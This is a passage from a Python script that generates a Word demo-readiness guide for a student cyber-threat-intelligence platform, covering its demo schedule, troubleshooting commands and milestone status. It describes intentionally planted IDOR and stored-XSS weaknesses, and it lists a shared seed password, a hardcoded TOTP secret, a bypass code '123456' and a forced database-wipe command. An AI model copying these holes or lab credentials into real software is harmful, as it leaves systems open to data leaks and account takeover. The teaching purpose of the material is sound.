        ["06:30 - 08:30", "Triage Station & TLP Barrier (Screen 3 & 4)", "Switch to 'analyst_riya'. Open Screen 3. Review pending IoC, assign confidence 90, MITRE T1566, and approve. Open Screen 4 and fetch STIX feed.", "'Contributors cannot publish directly; intelligence must be triaged by an Analyst with mandatory justification. Our STIX 2.1 feed applies server-side canAccessTLP filtering to exclude TLP:RED for consumers.'", "Screen 3 Review Modal & Screen 4 STIX 2.1 JSON bundle."],
        ["08:30 - 10:30", "Audit Chain & Observability (Screen 4 & CLI)", "Click 'Run Audit Chain Integrity Verification' on Screen 4. In Terminal 2, run 'node scripts/verify-audit-chain.js'. Query '/metrics'.", "'Our audit log implements continuous SHA-256 hash chaining back to Genesis. Any out-of-band database tampering breaks the hash chain and is immediately flagged by our offline verifier.'", "Terminal verify-audit-chain.js output (STATUS: VERIFIED)."],
        ["10:30 - 13:00", "Vulnerability Demonstration (M11)", "In Terminal 2, run 'npm run test:vuln'. In browser console, show TLP:RED leak on /api/reports and unescaped HTML5 event handlers in /api/reports/:id.", "'In Milestone M11, we demonstrated two realistic weaknesses: (1) V02 IDOR on GET /api/reports/:id leaking TLP:RED data across tenant boundaries, and (2) V04 Stored XSS where naive regex misses HTML5 event handlers.'", "Terminal output showing 5/5 passing vulnerability tests."],
        ["13:00 - 14:00", "Platform Regression Suite", "In Terminal 2, run 'npm test'. Show 53/53 tests passing across 10 test suites.", "'To guarantee software stability, our platform is verified by 53 automated unit and integration tests covering security, cryptographic, and API boundaries with zero failures.'", "Terminal test runner output showing 53 passed, 0 failed."],
        ["14:00 - 15:00", "M12 Remediation Roadmap & Q&A", "Explain planned M12 secure refactoring: canAccessTLP check for V02 and HTML entity encoding for V04.", "'In Milestone M12, we will refactor reportController.js to enforce 403 Forbidden on TLP:RED access and implement strict HTML entity encoding. I am now ready for your questions.'", "Word report cover page & Traceability Matrix table."]
    ]
    add_table_data([Inches(1.1), Inches(1.3), Inches(1.4), Inches(1.8), Inches(0.9)], demo_schedule[0], demo_schedule[1:])

    doc.add_page_break()

    # =============================================================
    # SECTION 5 — TROUBLESHOOTING & DIAGNOSTIC COMMANDS
    # =============================================================
    add_h1("SECTION 5 — TROUBLESHOOTING & DIAGNOSTIC GUIDE")
    add_p("This section provides the safest diagnostic commands and resolution procedures for common operational issues encountered during live demonstrations.")

    troubleshoot_items = [
        ["Issue Encountered", "Likely Root Cause", "Diagnostic Command", "Safe Resolution Action"],
        ["Application does not start (EADDRINUSE)", "Port 3000 is occupied by a previously running background process.", "netstat -ano | findstr :3000", "Kill the hanging process: taskkill /F /PID <PID>, then re-run npm start."],
        ["Missing package.json (ENOENT)", "Terminal is in personal directory (e.g., C:\\Users\\ABI) instead of project root.", "cd", "Switch to project directory: cd /d v:\\SSE-ENDSEM, then run npm start."],
        ["Database not initialized / Missing tables", "SQLite database file was deleted or permissions denied in data/ directory.", "dir data\\cti_platform.sqlite", "Wipe and re-seed cleanly: Remove-Item data\\cti_platform.sqlite* -Force; npm start."],
        ["Login fails with 401 Unauthorized", "Incorrect password entered (SQLite is seeded with 'Password123!').", "sqlite3 data/cti_platform.sqlite \"SELECT username, role FROM users;\"", "Ensure password entered is 'Password123!' (the universal seed password)."],
        ["TOTP verification fails", "Temporary challenge token expired (5m TTL) or invalid code entered.", "node -e \"console.log(require('./src/services/totpService').getTOTPCode('JBSWY3DPEHPK3PXQ'))\"", "Use lab demo code '123456' or auto-calculated code within the 30-second window."],
        ["Triage queue displays 403 Access Denied", "Signed-in persona is ROLE_CONTRIBUTOR or ROLE_CONSUMER instead of ROLE_ANALYST.", "Check user chip in header", "Sign in as 'analyst_riya' on Screen 1 before opening Screen 3."],
        ["Report submission rejected (Missing fields)", "Field name mismatch between client and controller.", "Check browser DevTools Network tab", "Ensure both title, summary, and contentMarkdown fields contain non-empty strings."],
        ["Audit verification fails (TAMPERING_DETECTED)", "An out-of-band manual UPDATE or DELETE was executed directly in SQLite.", "node scripts/verify-audit-chain.js", "Reset database cleanly by removing SQLite file and restarting the server."],
        ["Vulnerability test fails", "Test database was modified by manual concurrent requests.", "npm run test:vuln", "Run the test isolated: node --test tests/vulnerability/vulnerabilityDemo.test.js."]
    ]
    add_table_data([Inches(1.5), Inches(1.5), Inches(1.8), Inches(1.7)], troubleshoot_items[0], troubleshoot_items[1:])

    doc.add_page_break()

    # =============================================================
    # SECTION 6 — FINAL STATUS & DEMO READINESS
    # =============================================================
    add_h1("SECTION 6 — FINAL STATUS & DEMO READINESS")

    add_h2("6.1 Formal Verification Audit Results")
    add_bullet(" PASS: Core application startup, health probes, relational database initialization, and UI asset serving.", bold_prefix="[PASS] Startup & Core: ")
    add_bullet(" PASS: Multi-factor authentication (Bcrypt salting, RFC 6238 TOTP, and HMAC-SHA256 JWT generation).", bold_prefix="[PASS] Identity & MFA: ")
    add_bullet(" PASS: Strategy Pattern IoC validation, ReDoS-resistant regular expressions, and automatic canonical defanging.", bold_prefix="[PASS] Ingestion Layer: ")
    add_bullet(" PASS: Analyst triage workflow, mandatory review logging, and MITRE ATT&CK technique classification.", bold_prefix="[PASS] Triage Workbench: ")
    add_bullet(" PASS: Server-side canAccessTLP filtering and OASIS STIX 2.1 threat feed distribution.", bold_prefix="[PASS] Dissemination Layer: ")
    add_bullet(" PASS: Continuous SHA-256 hash-chained audit logging and offline verification utility.", bold_prefix="[PASS] Audit Integrity: ")
    add_bullet(" PASS: Standard Prometheus /metrics exposition with all 5 required security telemetry counters.", bold_prefix="[PASS] Security Monitoring: ")
    add_bullet(" PASS: Milestone M11 automated vulnerability demonstration suite (5/5 tests passing).", bold_prefix="[PASS] Vulnerability Tests: ")
    add_bullet(" PASS: Full platform regression test suite (53/53 tests passing across 10 test suites).", bold_prefix="[PASS] Regression Suite: ")

    add_h2("6.2 Readiness Assessment")
    add_p("A. PASS: The platform satisfies all requirements for Milestones M1 through M11 without errors or regressions.", bold_prefix="Status: ")
    add_p("B. FAIL: Zero (0) test failures detected across 53 unit and integration test cases.", bold_prefix="Failures: ")
    add_p("C. BLOCKERS: Zero (0) critical bugs, unhandled exceptions, or operational blockers identified.", bold_prefix="Blockers: ")
    add_p("D. Live Demonstration Readiness: YES. The application is 100% ready for live faculty evaluation and viva examination.", bold_prefix="Demo Readiness: ")
    add_p("E. Pre-M12 Requirements: Milestone M11 documentation accepted; vulnerability evidence preserved in evidence/M11_VULNERABILITY_DEMONSTRATION.md; regression baseline verified.", bold_prefix="Pre-M12 Baseline: ")
    add_p("F. Recommended Next Task: Await faculty approval, then proceed to Milestone M12 (Secure Refactoring & Security Hardening) to remediate V02 (IDOR) and V04 (Stored XSS).", bold_prefix="Next Step: ")

    # Save Document
    filename = "Demo_Readiness_and_Vulnerability_Demonstration_M1_M11.docx"
    doc.save(filename)
    print(f"Successfully generated demonstration guide: {filename} ({os.path.getsize(filename)} bytes)")

if __name__ == '__main__':
    create_document()
